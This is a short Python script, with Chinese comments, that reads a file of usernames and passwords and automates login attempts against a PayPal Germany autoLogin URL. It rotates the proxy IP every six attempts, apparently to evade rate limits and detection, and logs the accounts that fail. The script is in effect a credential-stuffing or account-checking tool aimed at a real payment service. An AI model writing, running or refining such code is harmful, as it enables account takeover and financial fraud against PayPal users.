
from account_load import ReadAccountToArray
from error_log import WriteErrorLog
from mock_login import MockWeb
from auto_proxy import AutoChangeProxy
import time

# 全局配置文件，执行几次切换代理
globalCount = 6
globalCountry = 'DE'
globalIpList = []

def main():
  # 逐行读取账号文档
  rat = ReadAccountToArray('./account/user.txt')
  account_list = rat.account_list
  error_list = []
  count = 0
  isDone = False
  # 模拟登录
  for item in account_list: 
    print(count)
    print(globalCount)
    if count >= globalCount:
       count = 0
       # 执行超过6，切换代理
       acp = AutoChangeProxy()
       # 返回执行结果
       acp.change_ip(country=globalCountry, ip="88.*.*.*") 
    mock = MockWeb('https://www.paypal.de/myaccount/security/autoLogin', item['name'], item['password'])
    if globalCountry=='US':
      isDone = mock.runUs()
    elif globalCountry == 'DE':
      isDone = mock.runDe()
           
    if not isDone:
      error_list.append(item)  
    time.sleep(2)
    count = count + 1
  # 写入错误日志  
  if len(error_list) > 0:
       WriteErrorLog(error_list)  
  
  print(error_list)
  print('结束战斗...')  

# def testErrorLog(): 
#     WriteErrorLog([{'name':'info', 'password': '121212'},{'name':'admin', 'password': '343434'}]) 

if __name__ == '__main__':
  main()
